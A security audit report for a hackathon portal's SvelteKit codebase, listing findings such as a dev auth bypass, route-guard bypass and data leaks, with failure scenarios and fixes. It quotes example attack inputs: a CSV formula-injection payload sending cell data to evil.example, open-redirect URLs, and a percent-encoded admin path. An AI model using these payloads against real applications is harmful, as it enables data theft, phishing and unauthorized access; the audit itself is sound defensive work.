# Audit findings — merged mainline (post feature/15-audit-logging + feature/1-seed-data)

Audited at commit `c8673e3`. Every finding below was verified by reading the code path
end to end, not inferred from naming.

Baseline at time of audit: 389/389 tests pass, `svelte-check` 0 errors, `npm run lint`
clean, production build succeeds.

---

## Critical

### C1. The dev auth bypass can activate in a deployed environment

`src/lib/server/env.ts:23-45`, `src/lib/server/auth.ts:14-34`, `src/routes/login/+page.server.ts:34-58`

`deployEnv()` falls back to `'development'` whenever `VERCEL_ENV` is unset **and**
`NODE_ENV !== 'production'`. A self-hosted deploy (`node build`) that forgets to set
`NODE_ENV=production` therefore runs the dev bypass: `usesSupabaseAuth()` is false, the
login form accepts any `@yopmail.com` address that exists in the database with no
password, and the session is an unsigned `session_uid` cookie with `secure: false`.

**Failure scenario:** the app is deployed anywhere other than Vercel without
`NODE_ENV=production`. `prisma/seedUsers.ts` creates `admin1@yopmail.com` with
`Role.ADMIN`. Anyone who reaches the login page types that address and is now a full
admin — every applicant's name, email, and decision, plus the ability to mail all of
them. No credential required.

**Fix:** make the bypass opt-in and impossible to enable by omission. In `validateEnv()`,
throw when `!usesSupabaseAuth()` unless an explicit `ALLOW_DEV_AUTH=1` is set, and treat
any unrecognized/missing environment as production rather than development.

### C2. `npm run db:seed` has no production guard

`prisma/seed.ts:1-30`, `prisma/seedUsers.ts:493-506`

The seed script runs against whatever `DATABASE_URL` points at, with no environment
check. It creates admin/organizer accounts on `@yopmail.com` addresses. With
`SEED_PRUNE=1` (`npm run db:seed:fresh`) it also runs `deleteMany` over every
`@yopmail.com` account not in its generated set.

**Failure scenario:** a `.env` still pointing at the production Supabase URL, plus one
`npm run db:seed`, injects passwordless admin accounts into production (which C1 then
makes exploitable). `db:seed:fresh` additionally deletes real accounts on that domain.

**Fix:** refuse to run when `isProduction()` (or when `DATABASE_URL` is not localhost)
unless an explicit `SEED_ALLOW_PRODUCTION=1` override is present.

---

## High

### H1. A scan code of `RC-` matches every user and checks in a random person

`src/lib/server/trpc/routers/scan.ts:18-28` and the duplicated inline copy at `127-153`

Both lookup paths do `uid: { endsWith: userCode.replace(/^RC-/i, '') }`. The input schema
only requires `min(1)`, so the literal string `RC-` survives validation and reduces to
`endsWith: ''` — which in SQL is `uid LIKE '%'`, matching every row. `findFirst` then
returns an arbitrary user.

**Failure scenario:** a volunteer at the door types `RC-` into manual entry (or the
scanner reads a truncated code). `scan.scanUser` records a check-in against whichever
user the database returns first, and the audit log attributes it to them. The real
attendee is not checked in, and someone else's record is corrupted. Short suffixes are a
softer version of the same bug: `1` matches every uid ending in `1`, silently picking one.

**Fix:** require the stripped code to be non-empty and long enough to be unambiguous
(the QR format is `RC-XXX`), and use `findMany` + reject on more than one match rather
than `findFirst`. Delete the duplicated inline block in `scanUser` and call the shared
`resolveUserByCode`.

### H2. Application deadlines are decorative — nothing enforces them server-side

`src/lib/server/trpc/routers/application.ts:25,70,146`; settings columns at
`src/lib/server/trpc/routers/settings.ts:6-26`

`applicationOpen`, `applicationDeadline`, and `RSVPDeadline` are configured in
`/admin/settings`, stored, and rendered — but no server code ever reads them for a
decision. `application.save`, `application.submit`, `application.rsvp`, and
`application.rsvpDecline` check only the user's own status.

**Failure scenario:** an applicant submits a week after the deadline, or RSVPs after the
RSVP deadline, straight through the UI or by replaying the tRPC call. Organizers believe
the window closed and admissions is working from a set that is still changing.

**Fix:** load `Settings` in each of those mutations and reject with `BAD_REQUEST` outside
the window (`save`/`submit` against open/deadline, `rsvp`/`rsvpDecline` against
`RSVPDeadline`), with a test per boundary.

### H3. Answers stay editable after submission

`src/lib/server/trpc/routers/application.ts:25-65`

`application.save` upserts a response with no check on the user's status. `submit`
enforces `status === CREATED`, so it can't be submitted twice — but the answers behind an
already-submitted application remain writable forever.

**Failure scenario:** an applicant submits, is reviewed and rejected, then edits their
answers via the still-live endpoint. The application an admin decided on is not the
application now in the database, and the audit trail shows no edit.

**Fix:** reject `save` unless `status === CREATED` (and inside the application window, per
H2).

---

## Medium

### M1. Open redirect in the dev login action

`src/routes/login/+page.server.ts:56-57`

`redirect(302, redirectTo ? decodeURIComponent(redirectTo) : '/')` performs no
same-origin validation. The OAuth callback at `src/routes/auth/callback/+server.ts:19`
does exactly this check — this path was missed.

**Failure scenario:** `/login?redirectTo=https%3A%2F%2Fevil.example` sends a user who
just authenticated to an attacker's page, which is a credible phishing hop because the
link legitimately starts on the real site. Dev-mode only today, but C1 shows dev mode can
reach a deploy.

**Fix:** apply the callback's rule — accept only values starting with `/` and not `//`.

### M2. CSV export is vulnerable to formula injection

`src/lib/server/trpc/routers/user.ts:181-196`

Only `name` is quoted, and no field is neutralized against leading `=`, `+`, `-`, or `@`.

**Failure scenario:** an applicant sets their name to `=HYPERLINK("https://evil.example?d="&A1,"click")`.
An admin exports the user list and opens it in Excel or Sheets, and the formula runs with
the exported roster in scope. `email`, `roles`, and the decision fields are also unquoted,
so any comma in stored data shifts every subsequent column.

**Fix:** quote every field and prefix a `'` to any value beginning with `= + - @`.

### M3. Team size limit is checked non-atomically

`src/lib/server/trpc/routers/team.ts:110-142` and `161-200`

`acceptInvite` and `joinByCode` both read the member count, then write in a separate
statement. `MAX_TEAM_SIZE` is enforced between the two.

**Failure scenario:** three pending invitees on a 3-member team accept within the same
moment. Each read sees 3, each write succeeds, and the team ends with 6 members — past
the documented maximum, with no error surfaced to anyone.

**Fix:** perform the membership write conditionally (a `updateMany` guarded on the count,
or a transaction with an isolation level that re-checks) and fail the losers.

### M4. Team invitations don't normalize the email address

`src/lib/server/trpc/routers/team.ts:52-107`

`inviteMember` looks up `where: { email: input.email }` and stores `email: input.email`
verbatim, while every other path in the codebase lowercases (`auth.ts:51`,
`scan.ts:31`, `application.ts:191`).

**Failure scenario:** a hacker invites `Teammate@Example.com`, whose stored address is
`teammate@example.com`. The lookup returns nothing and they're told "User not found."
even though the account exists.

**Fix:** lowercase and trim on entry, matching `resolveUserByEmail`.

### M5. Organizers receive full user records from the scan endpoints

`src/lib/server/trpc/routers/scan.ts:54-110,184-201`

`lookup`, `lookupByEmail`, `getRecent` (`include: { user: true }`), and `getHistory` all
return complete `User` rows to any `portalProcedure` caller. `src/lib/auth/permissions.ts:8-14`
states organizers are explicitly not to see "anything holding real user data", and
`dashboard.stats` goes to some length to withhold the activity feed from them.

**Failure scenario:** an organizer calls `scan.getRecent` (or reads the network response
on the scan page they legitimately use) and gets every scanned user's email, university,
phone, status, and both decision fields — including who was rejected.

**Fix:** `select` only what the scan UI renders (uid, name, roles, status, university) on
these endpoints. `getHistory` should additionally be restricted, since it accepts an
arbitrary `userId`.

---

## Low

### L1. Every authenticated user can read all email templates

`src/lib/server/trpc/routers/settings.ts:76-79`

`settings.get` is `authedProcedure` and returns the whole row, including the six
lifecycle templates and subjects. The hacker portal only needs the dates and timezone.

**Fix:** return a narrowed projection for non-admin callers.

### L2. The `/design` style guide ships publicly

`src/routes/design/+page.svelte`

No guard and no environment check — the internal design system reference is reachable in
production by anyone who guesses the path. Harmless in content, but it isn't meant to be
part of the public surface.

**Fix:** guard it behind portal access, or exclude it from production builds.

### L3. Seed question matching is fragile

`prisma/seed.ts` (`main`, question loop)

Questions are matched by `title` + exact `targetRole` array. Editing a question's title in
`/admin/application-editor` and re-running the seed creates a duplicate rather than
updating the existing row.

**Fix:** give seeded questions a stable key, or match on `order` + `targetRole`.

---

## Verified as already handled (not defects)

- `buildRecipientWhere` (`src/lib/server/recipients.ts`) is genuinely shared by browse and
  send, and the engaged-but-empty case matches nothing in both — the documented footgun is
  actually closed.
- `admissions.setDecision` is a real compare-and-swap; there is no check-then-write window.
- The audit log snapshots `actorName`/`actorEmail` and no read path joins `actor`, so the
  trail survives account deletion as documented.
- No `{@html}` anywhere in the codebase; `marked` output goes only to outbound email, never
  to a rendered page.
- `.gitignore` covers `.env*` (except `.env.example`) and `src/lib/generated`; no secret or
  generated client is tracked.
- The OAuth callback validates its `next` parameter against absolute URLs.

---

---

# Second audit pass (post-`61bee0b`)

A full re-audit of the whole codebase, run after the first round of fixes above. Six
subsystem sweeps (auth/env/session, hacker routers, admin routers, portal/scan,
route/page layer, config/schema/email) plus independent verification of every finding by
reading the code path end to end. Everything below was **fixed** in this pass unless the
heading says otherwise.

Baseline after this pass: **454/454 tests pass** (was 433), `svelte-check` 0 errors,
`npm run lint` clean, production build succeeds, dev server boots, and the route-guard
bypass fix (C3) was verified against a live server.

## Critical / High

### C3. Route guard bypass via a percent-encoded path

`src/hooks.server.ts`. The guard tested the raw `event.url.pathname` with
`startsWith('/admin/')`, but SvelteKit routes on the _decoded_ path — so `/%61dmin/...`
(`%61`→`a`) skipped the guard entirely while still resolving to the admin route. Any
authenticated hacker could open `/%61dmin/settings`; an anonymous visitor got a 500 on
`/%61dmin/users` instead of a login redirect. **Fix:** decode the path with SvelteKit's
own `decode_pathname` algorithm before every guard check. Verified live: `/%61dmin/*` and
`/%68acker/*` now redirect to `/login`.

### H4. `user.me` / `team.getMyTeam` leaked other users' unreleased decisions and PII

`src/lib/server/trpc/routers/user.ts`, `.../team.ts`. Both used `include` on nested team
members and invitees, returning every scalar of _other people's_ `User` rows — email,
university, status, `claimedBy`, and above all `pendingDecision`, the embargoed decision
no one may see before `admissions.release`. Any hacker could read a teammate's (or a mere
invitee's) fate early from the page payload. **Fix:** a shared whitelist projection
(`src/lib/server/trpc/selects.ts`) — nested users expose only `{uid,name,email,roles}`,
and the caller's own row drops `pendingDecision` and the claim columns.

### H5. `application.submit` accepted blank answers to required questions

`.../application.ts`. `submit` built its "answered" set from row _existence_, and `save`
accepted `""`, so an applicant could satisfy every required question with empty strings.
**Fix:** count only responses whose trimmed value is non-empty.

### H6. `questions.list` was public and unfiltered

`.../questions.ts`. `publicProcedure` with no role returned every question — the same rows
`listAll` guards behind admin, including `regex`/`linkedField` internals and staff-audience
questions — to anyone. **Fix:** `authedProcedure`, bounded to applicant-audience (or
untargeted) questions; staff-only questions are never returned to the application form.

## Medium

- **M6. `admissions.list` dropped the decision filter when searching.** Two conditional
  spreads both wrote a top-level `OR`, so search silently overwrote the decision clause.
  Rebuilt as an `AND` array. (`admissions.ts`)
- **M7. `admissions.release` was a stale check-then-write** — it could publish and email an
  irreversible decision that another admin had changed mid-batch. Now a per-row
  compare-and-swap (`updateMany` keyed on the exact pending value); rows that moved are
  skipped and logged. (`admissions.ts`)
- **M8. `email.sendCustom` was not bound to the previewed count** — `filters:{}` matches
  everyone, so a client bug or replay could mail the whole database. Now requires an
  `expectedCount` and refuses if the set drifted. (`email.ts`, custom-email page)
- **M9. `email.sendTest` was an authenticated relay to any address** with the body never
  audited. Restricted to the calling admin's own inbox. (`email.ts`, templates page)
- **M10. Open redirect via backslash** — `startsWith('/') && !'//'` let `/\evil.com`
  through (browsers normalize `\`→`/`). Both the dev-login action and the OAuth callback now
  validate by parsing against the origin. (`login/+page.server.ts`, `auth/callback`)
- **M11. `updateRole` could remove the last admin** (or self-demote to lockout). Now refuses
  to strip ADMIN when no other admin remains, and rejects an empty role array. (`user.ts`)
- **M12. Scan check-in never set `CHECKED_IN`** — the whole checked-in branch (dashboard
  count, hacker view, `joinByCode` allowance) was dead. `scanUser` now promotes
  CONFIRMED→CHECKED_IN on the check-in action, atomically with the scan row. (`scan.ts`)
- **M13. Team lifecycle holes:** `acceptInvite` didn't check the caller was teamless
  (team-hop → orphaned team); eligibility (accepted+confirmed/checked-in) was enforced
  inconsistently across `createTeam`/`inviteMember`/`acceptInvite`/`joinByCode`;
  `declineInvite` didn't require PENDING; `leaveTeam` was a non-atomic check-then-delete;
  `inviteMember` was an account-existence/admission oracle. All fixed: a shared
  `isTeamEligible`, an in-transaction teamId re-check, a PENDING guard, an atomic leave,
  and a generic `{sent:true}` invite response. (`team.ts`)
- **M14. RSVP could downgrade a CHECKED_IN attendee** and a declined spot could be
  re-confirmed despite the "permanent" copy. `rsvp`/`rsvpDecline` now reject CHECKED_IN,
  and `rsvp` rejects DECLINED. (`application.ts`)
- **M15. No answer validation server-side** — a NUMBER field accepted "potato", a dropdown
  accepted a non-option, values were unbounded (and flowed into `User.name` via
  `linkedField`). `save` now validates type/options/min/max/regex, caps length, and rejects
  a missing question (NOT_FOUND) or wrong-audience question (FORBIDDEN). (`application.ts`)
- **M16. Application role selector was never persisted** — applying as Judge/Mentor/
  Volunteer dead-ended because `submit` validated against `[HACKER]`. `submit` now accepts
  and stores the applicant role. (`application.ts`, application page)
- **M17. No security headers.** Added `X-Frame-Options: DENY`, `X-Content-Type-Options`,
  and `Referrer-Policy` on every response. (`hooks.server.ts`)
- **M18. `settings.update` bypassed the template bounds** `updateTemplates` enforces, and
  had no date-ordering check. Added min/max on template/subject columns and a refine that
  open ≤ deadline ≤ RSVP. (`settings.ts`)
- **M19. Dev bypass could run against a remote DB.** `validateEnv` now refuses
  `ALLOW_DEV_AUTH=1` unless `DATABASE_URL` is local, and `.env.example` ships the flag
  commented out. (`env.ts`, `.env.example`)
- **M20. Email markdown rendered user-controlled `{{name}}` as raw HTML.** Variable values
  are now HTML-escaped for the body path (subjects and the preview are unaffected).
  (`email/variables.ts`, `email.ts`)

## Low (fixed)

- `sectionForPath` fail-open — an unmapped `/admin/*` path is now admin-only. (`hooks`)
- `canAccessHackerPortal` denied a combined ADMIN+ORGANIZER — admins keep access. (`permissions.ts`)
- `dashboard.stats` "no decision" bucket was always 0 (per-field count ignores nulls) — now `_all`.
- Recipient email filters were case-sensitive against lowercased stored addresses — now normalized. (`recipients.ts`, `email.ts`)
- CSV formula-injection set missing `\t` and `\r`. (`user.ts`)
- `schedule` events could end before they start, and a bad id 500'd instead of NOT_FOUND. (`schedule.ts`)
- `getProdSession` did an upsert (a write + row lock) on every request — now read-first. (`auth.ts`)
- `docker-compose` bound Postgres on all interfaces with `echo/echo` creds; now loopback-only and aligned to `.env.example`.
- `.gitignore` un-ignored `.env.test`.
- Added `Scan` indexes for the duplicate-check and recent-scans queries. (`schema.prisma`)

## Verified as already handled or deliberately not changed

- Root-router procedure wiring is correct: every per-person-data procedure is `adminProcedure`;
  the only `portalProcedure` uses (scan, schedule, dashboard aggregates) expose no per-person data.
- `admissions.setDecision` remains a clean compare-and-swap; the tempting applicant-role
  pre-check was intentionally **not** added, to keep it a single conditional UPDATE (staff
  uids never reach the endpoint via the UI).
- No `@@unique([teamId,email])` was added to `Invitation`: the model keeps DECLINED rows, so
  a unique constraint would break re-inviting a previously-declined address.
- Supabase auth cookies stay `httpOnly:false` — required by the browser client that
  initiates the OAuth redirect; noted, not changed.
